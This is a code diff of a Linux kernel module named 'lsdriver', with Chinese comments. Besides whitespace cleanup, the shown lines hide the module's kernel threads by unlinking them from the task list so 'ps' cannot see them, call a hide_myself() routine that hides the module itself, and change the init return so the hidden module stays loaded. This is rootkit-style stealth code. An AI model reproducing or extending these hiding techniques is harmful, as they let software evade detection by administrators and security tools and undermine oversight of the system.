@@ -2,19 +2,17 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 
-
 #include <linux/sched.h>
 #include <linux/kthread.h>
 #include <linux/delay.h>
-
 
 #include <linux/mm.h>
 #include <linux/pagemap.h>
 #include <linux/slab.h>
 #include <linux/vmalloc.h>
 
-#include <linux/list.h>	   // 内核链表操作
-#include <linux/kobject.h> 
+#include <linux/list.h> // 内核链表操作
+#include <linux/kobject.h>
 
 #include <linux/kallsyms.h>
 
@@ -245,7 +243,7 @@ static int ConnectThreadFunction(void *data)
 	return 0;
 }
 
-static void hide_myself(void)
+static void __attribute__((unused)) hide_myself(void)
 {
 	struct vmap_area *va, *vtmp;
 	struct module_use *use, *tmp;
@@ -311,26 +309,25 @@ static int __init lsdriver_init(void)
 	// 隐藏内核线程
 	if (detach_pid)
 	{
-		struct pid *chf_pid, *dhf_pid;
+		// struct pid *chf_pid, *dhf_pid;
 
 		// 从任务列表中移除，这使得任务在ps等命令中不可见
 		list_del_init(&chf->tasks);
 		list_del_init(&dhf->tasks);
 
-		//  从 task_struct 获取 pid 结构
-		chf_pid = task_pid(chf);
-		dhf_pid = task_pid(dhf);
+		// //  从 task_struct 获取 pid 结构
+		// chf_pid = task_pid(chf);
+		// dhf_pid = task_pid(dhf);
 
 		// 从 PID 哈希表中分离,PIDTYPE_PID表示操作的是主 PID
 		// detach_pid(chf_pid, PIDTYPE_PID);	//会死机，现在无法解决
 		// detach_pid(dhf_pid, PIDTYPE_PID);
-
 	}
 
-	// 隐藏内核模块本身
+	// // 隐藏内核模块本身
 	hide_myself();
 
-	return -1;
+	return 0;
 }
 
 static void __exit lsdriver_exit(void)
